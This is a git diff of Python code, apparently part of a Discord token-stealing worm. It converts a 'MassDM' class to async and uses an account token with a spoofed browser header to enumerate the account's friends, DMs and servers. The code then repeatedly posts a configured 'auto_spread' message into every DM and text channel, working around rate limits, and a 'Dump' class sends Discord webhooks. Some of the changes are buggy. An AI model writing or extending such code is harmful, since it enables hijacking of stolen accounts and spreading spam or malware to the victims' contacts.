@@ -1,9 +1,11 @@
+from time import time
 from urllib import request
 import requests
 import json
 from discord_webhook   import DiscordWebhook, DiscordEmbed
-
+import time
 from config import config
+import asyncio
 
 class Dump:
     def get_headers(self, token, content_type="application/json"):
@@ -78,21 +80,20 @@ class Dump:
             print('Failed to send webhook')
             
     def open_dm(self, token, recipient):
-        print("opening dm")
         payload = json.dumps({"recipients": [recipient]})
         
-        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers(token), data=payload)
+        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers, data=payload)
         print(json.loads(data.text)['id'] + ' dm id')
         return json.loads(data.text)['id']
     
 
 
 class MassDM:
-    def __init__(self, token):
+    async def init(self, token):
         self.token = token
-        self.headers = self.get_headers(token)
+        self.headers = await self.get_headers(token)
 
-    def get_headers(self, token, content_type="application/json"):
+    async def get_headers(self, token, content_type="application/json"):
         headers = {
         "Content-Type": content_type,
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
@@ -101,55 +102,83 @@ class MassDM:
             headers.update({"Authorization": token})
         return headers
     
-    def get_guilds(self):
+    async def get_guilds(self):
         data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers)
 
         return (json.loads(data.text))
     
-    def get_guild_channels(self, guild_id):
+    async def get_guild_channels(self, guild_id):
         data = requests.get(f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers)
         return (json.loads(data.text))
 
-    def get_dms(self):
-        data = requests.get(f"https://discordapp.com/api/users/@me/channels", headers=self.headers)
+    async def get_dms(self):
+        data = requests.get(f"https://discord.com/api/v8/users/@me/channels", headers=self.headers)
         return (json.loads(data.text))
 
-    def get_relationships(self):
+    async def get_relationships(self):
         data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.headers)
-        return len(json.loads(data.text))
+        return json.loads(data.text)
 
     
-    def message_channel(self, channel_id):
-        data = requests.post(f'https://discordapp.com/api/channels/{channel_id}/messages', headers=self.headers)
+    async def message_channel(self, channel_id):
+        while True:
+            body = {
+                "content": config['auto_spread']['message']
+            }
+            req = requests.post(f'https://discordapp.com/api/channels/{channel_id}/messages', headers=self.headers, json=body)
+            data = json.loads(req.text)
 
-
-    def open_dm(self, recipient):
-        payload = json.dumps({"recipients": [recipient]}) #[] because its an array just only 1 element
+            if data.status_code == 401:
+                break
         
-        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.headers, data=payload)
+            if data.status_code == 403:
+                break
+
+            if 'retry_after' in data:
+                print(data['retry_after']/1000, " seconds")
+                await asyncio.sleep(data['retry_after']/1000)
+
+
+            if 'code' in data:
+                if data['code'] == 50007:
+                    break
+            
+            if 'Missing Access' in data:
+                break
+            
+            if 'id' in data:
+                break
+                
+
+
+    async def open_dm(self, recipient):
+        payload = json.dumps({"recipients": [recipient]}) #[] because its an array just only 1 element, this endpoint designed to support multiple people
+        
+        data = requests.post("https://discord.com/api/users/@me/channels", headers=self.headers, data=payload)
         return json.loads(data.text)['id']
     
-    def close_dm(self, dm_id):
-        data = requests.delete(f"https://discord.com/api/v9/users/@me/channels/{dm_id}", headers=self.headers)
+    async def close_dm(self, dm_id):
+        data = requests.delete(f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers)
 
-
-    def message_friends(self):
-        for relationship in self.get_relationships():
-            if relationship['type'] != 1:
-                dm_id = self.open_dm(relationship['id'])
-                self.message_channel(dm_id)
-                self.close_dm(dm_id)
+    async def message_friends(self):
+        for relationship in await self.get_relationships():
+            if relationship['type'] == 1:
+                dm_id = await self.open_dm(relationship['id'])
+                # dm_id = self.message_channel(dm_id)
+                await self.close_dm(dm_id)
     
-    def message_dms(self):
-        for dm in self.get_dms():
-            self.message_channel(dm['id'])
-            self.close_dm(dm['id'])
+    async def message_dms(self):
+        for dm in await self.get_dms():
+            print(dm)
+            await self.message_channel(dm['id'])
+            await self.close_dm(dm['id'])
 
 
-    def message_guilds(self):
-        for guild in self.get_guilds():
-            for channel in self.get_guild_channels(guild['id']):
-                self.message_channel(channel['id'])
+    async def message_guilds(self):
+        for guild in await self.get_guilds():
+            for channel in await self.get_guild_channels(guild['id']):
+                if channel['type'] == 0:
+                    await self.message_channel(channel['id'])
 
 
     
